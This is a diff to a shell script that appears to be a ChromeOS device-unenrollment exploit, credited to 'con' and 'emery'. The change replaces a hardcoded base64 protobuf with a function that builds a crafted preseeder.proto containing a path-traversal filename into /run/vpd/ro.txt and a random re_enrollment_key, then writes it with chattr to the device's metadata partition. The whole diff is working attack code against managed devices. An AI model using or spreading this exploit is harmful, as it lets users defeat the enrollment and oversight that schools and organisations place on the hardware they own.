@@ -8,6 +8,10 @@ fail(){
 	exit 1
 }
 
+proto_gaming(){
+	printf '\x0a\x7f\x0a\x23unencrypted/../../../run/vpd/ro.txt\x10\x54\x1a\x56\x12\x54re_enrollment_key="'"$(hexdump -e '1/1 "%02x"' -v -n 32 /dev/urandom)"'"' | base64 -w0
+}
+
 get_fixed_dst_drive() {
 	local dev
 	if [ -z "${DEFAULT_ROOTDEV}" ]; then
@@ -78,10 +82,10 @@ part1(){
 part2(){
     mkdir "$metadata"
     mount "$intdis_prefix"11 "$metadata"
-	chattr -i "$metadata"/preseeder.proto
-	rm -f "$metadata"/preseeder.proto
-    printf "Cn8KI3VuZW5jcnlwdGVkLy4uLy4uLy4uL3J1bi92cGQvcm8udHh0EFQaVhJUcmVfZW5yb2xsbWVudF9rZXk9IjA0MzIzODMwMjAyNDU3NTYzNDIxNTY5NzMxODQyODE3MjcxNzM5Mjg5MzgyNjUxNzMzNjcwMTIwMDk5MzA0MjMi" | tee "$metadata"/preseeder.proto
-    chattr +i "$metadata"/preseeder.proto 
+    chattr -i "$metadata"/preseeder.proto
+    rm -f "$metadata"/preseeder.proto
+    proto_gaming | tee "$metadata"/preseeder.proto
+    chattr +i "$metadata"/preseeder.proto
     sync
     umount "$metadata"
     sync
@@ -103,7 +107,7 @@ main(){
 	fi
     clear
 	echo "Script by con, exploit and script updates made by emery"
-    echo "Protowrite: root file write > unpatch Quicksilver > unenrollment"
+	echo "Protowrite: root file write > unpatch Quicksilver > unenrollment"
 	echo "This will unenroll your device"
 	echo "Continue? (y/N)"
 	read -r action
